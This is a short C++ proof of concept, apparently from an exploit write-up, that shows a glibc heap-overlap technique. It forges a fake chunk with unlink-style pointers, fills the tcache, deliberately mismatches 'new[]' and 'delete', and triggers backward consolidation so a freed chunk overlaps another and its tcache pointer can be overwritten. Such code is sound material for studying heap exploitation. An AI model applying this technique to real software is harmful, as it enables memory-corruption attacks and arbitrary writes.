#include <cstdlib>
#include <cstdint>

struct Char {
  char ch;

  Char() {}
  ~Char() {}
};

struct String {
  Char     *arr;
  uint64_t size;

  String() {
  }

  ~String() {
  }
};

// This is a simplified POC of the heap overlap acheived in our exploit 
int main() {
  // First allocate some number of chunks for later
  void* tmps[7];
  for (int i = 0; i < 7; i++) {
    tmps[i] = malloc(0x88);
  }

  // Have a large chunk allocated before this strings array
  void *prev = malloc(0x938);
  String *arr = new String[0x90];

  // The size of the strings in this array will then coincide with a heap size
  arr[8].size = 0x11;
  arr[8].arr = (Char*)0xdeadbeef;
  arr[9].size = 0x11;
  arr[9].arr = (Char*)0xdeadbeef;

  // Now free prev, so that we can then do some other schenanegans with it.
  free(prev);

  // Allocate some chunk size for later
  void *tmp = malloc(0x18);

  // This will be allocated in the place of `prev` chunk. We use this to craft a
  // fake chunk which will cause backwards consolidation  over some other chunks
  uint64_t *p = (uint64_t*)new Char[0x30];
  p[1] = 0x911;
  // Change these pointers to whereever p is pointed to
  p[2] = (uint64_t)(&arr[8].arr - 3);
  p[3] = (uint64_t)(&arr[8].arr - 2);
  arr[8].arr = (Char*)p;

  // Free these chunks that we allocated in the beginning, so that this will
  // fill up tcache.
  for (int i = 0; i < 7; i++) {
    free(tmps[i]);
  }

  // Malloc some chunk, which will be inside our fake chunk
  void *victim = malloc(0x18);

  // Delete arr, which triggers backwards consolidation which traps this victim
  // heap in this larger consolidated chunk
  delete arr;

  // Note that tmp and victim are the same size.
  free(tmp);
  // Now there is an tcache FD pointer located in the freed chunk at victim.
  free(victim);

// Here is our fake-heap layout 
// chk_size(before) = 0x930
//
//************* victim, before + 0x20
// chk_size(fake) = 0x911
// ...
// prev_size = 0x910 (chk_size of victim)
//************* (void*)victim - 8, before + 0x930
// chk_size = 0x90
//************* victim
// ...
//************* victim + 8, (void*)victim + 0x80
// arr = 0xdeadbeef
// chk_size(victim+0x90) = size = 0x11
//************* victim + 9, (void*)victim + 0x90
// arr = 0xdeadbeef
// chk_size(victim+0x100) = size = 0x11
//

  // Now if we were to allocate some large amount of data, we can then overwrite
  // FD of victim and get an arbitrary pointer
}

